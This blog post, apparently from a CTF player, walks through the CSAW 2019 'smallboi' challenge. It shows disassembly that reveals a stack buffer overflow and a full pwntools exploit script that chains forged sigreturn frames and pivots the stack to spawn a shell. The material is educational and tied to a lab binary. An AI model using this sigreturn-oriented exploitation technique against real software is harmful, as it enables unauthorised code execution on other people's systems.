+++
categories = ["SigROP","Stack Pivot","CTF","Linux"]
date = "2021-08-15"
description = "CSAW 2019 'smallboi' challenge writeup."
featuredpath = "date"
linktitle = ""
title = "CSAW 2019 :: Smallboi"
slug = "csaw-2019-smallboi"
type = "posts"
+++

## Reverse Engineering

Like usual, we'll start by running `file` to get a brief overflow of the executable's architecture. Note that it is a 64-bit linux executable.

```
$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
```

Running `checksec` reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won't be able to execute any shellcode on the stack.

```
$ checksec ./small_boi
[*] './small_boi'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Running the executable reveals that it, at some point, takes user input. We'll need to investigate this further to determine whether there is a vulnerability present.

```
$ ./small_boi
asdfsadf
```

Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an `exit` syscall.

```
entry0 ();
0x004001ad      push rbp
0x004001ae      mov rbp, rsp
0x004001b1      mov eax, 0
0x004001b6      call fcn.0040018c
0x004001bb      xor rax, rdi
0x004001be      mov rax, 0x3c      ; '<' ; 60
0x004001c5      syscall            ; exit(...)
0x004001c7      nop
0x004001c8      pop rbp
0x004001c9      ret
```

Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.

We can see that the function reads 512 bytes of data in from `stdin` and stores it at a location only 32 bytes below the base of the function's stack frame.

```
fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c      push rbp
0x0040018d      mov rbp, rsp
0x00400190      lea rax, [var_20h] ; rax = *var_20h
0x00400194      mov rsi, rax       ; rsi = rax = *var_20h
0x00400197      xor rax, rax       ; rax = 0
0x0040019a      xor rdi, rdi       ; rdi = 0
0x0040019d      mov rdx, 0x200     ; rdx = 512
0x004001a4      syscall            ; read(stdin, *var_20h, 512)
0x004001a6      mov eax, 0
0x004001ab      pop rbp
0x004001ac      ret
```

Looking at the disassembly for the `.text` section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame. 

```
;-- section..text:
0x0040017c      push rbp           ; [02] -r-x section size 78 named .text
0x0040017d      mov rbp, rsp
0x00400180      mov eax, 0xf       ; 15
0x00400185      syscall            ; rt_sigreturn(...)
0x00400187      nop
0x00400188      pop rbp
0x00400189      ret
```

We also discover a `"/bin/sh"` string stored in the `.rodata` section. This could be very useful - however, I'm going to avoid using it. 

I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I've arbitrarily decided that it feels a little like cheating.

```
;-- str.bin_sh:
;-- section..rodata:
0x004001ca          .string "/bin/sh" ; len=8 ; [03] -r-- section size 8 named .rodata
```

For our alternative solution, we need to find a section within the binary that we have write permissions for.

Using `readelf`, we can see that we have write permissions for the `.data` section, stored at `0x601000`. We'll use this location to write a `"/bin/sh"` string, and pivot our stack. 

```
$ readelf --sections ./small_boi 
There are 9 section headers, starting at offset 0x1090:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.bu[...] NOTE             0000000000400158  00000158
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .text             PROGBITS         000000000040017c  0000017c
       000000000000004e  0000000000000000  AX       0     0     1
  [ 3] .rodata           PROGBITS         00000000004001ca  000001ca
       0000000000000008  0000000000000000   A       0     0     1
  [ 4] .eh_frame_hdr     PROGBITS         00000000004001d4  000001d4
       0000000000000024  0000000000000000   A       0     0     4
  [ 5] .eh_frame         PROGBITS         00000000004001f8  000001f8
       0000000000000078  0000000000000000   A       0     0     8
  [ 6] .data             PROGBITS         0000000000601000  00001000
       0000000000000010  0000000000000000  WA       0     0     8
  [ 7] .comment          PROGBITS         0000000000000000  00001010
       000000000000002a  0000000000000001  MS       0     0     1
  [ 8] .shstrtab         STRTAB           0000000000000000  0000103a
       0000000000000053  0000000000000000           0     0     1
```


## Information Gathering

Let's do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.

Here's a quick script that'll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.

```py
#!/usr/bin/env python3

from pwn import *


r = process('./small_boi')
gdb.attach(r)

r.clean()
r.writeline(cyclic(512, n=8))

r.interactive()
```

Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.

```
 ► 0x4001ac    ret    <0x6161616161616166>
```

Using pwntools' `cyclic_find` function, and using the value above, we can find the offset of the return address from the start of our input buffer.

```py
In [2]: cyclic_find(0x6161616161616166, n=8)
Out[2]: 40
```


## Exploit Development

We can chain sigreturn instructions to perform a `read` syscall and store `"/bin/sh"` in memory, before making another sigreturn call to execute `execve` with our `"/bin/sh"` string.

We just need to make sure that our first forged sigreturn frame maintains `$rip` and pivots the stack to `.data`, where we can continue execution. 

```py
#!/usr/bin/env python3

from pwn import *

context.clear(arch='amd64')


pad = b'A'*40


# address of sigreturn syscall
sigret = p64(0x00400180)

# address of "/bin/sh" string 
bin_sh = 0x004001ca

# address of syscall instruction
'''
syscall; nop; pop rbp; ret
'''
syscall = 0x0400185

# address of data section
data = 0x00601000 


read_frame = SigreturnFrame()

read_frame.rax = constants.SYS_read
read_frame.rdi = 0
read_frame.rsi = data
read_frame.rdx = 1000
read_frame.rip = syscall
read_frame.rsp = data + 8

read_frame = bytes(read_frame) 


execve_frame = SigreturnFrame()

execve_frame.rax = constants.SYS_execve
execve_frame.rdi = data
execve_frame.rsi = 0
execve_frame.rdx = 0
execve_frame.rip = syscall

execve_frame = bytes(execve_frame)


r = process('./small_boi')

r.clean()
r.writeline(pad + sigret + read_frame)

r.clean(1)
r.writeline(b'/bin/sh\x00' + b'A'*8 + sigret + execve_frame)

r.clean()
r.interactive()
```

And finally, here's our exploit in action.

```
$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$ 
[*] Stopped process './small_boi' (pid 2731)
```
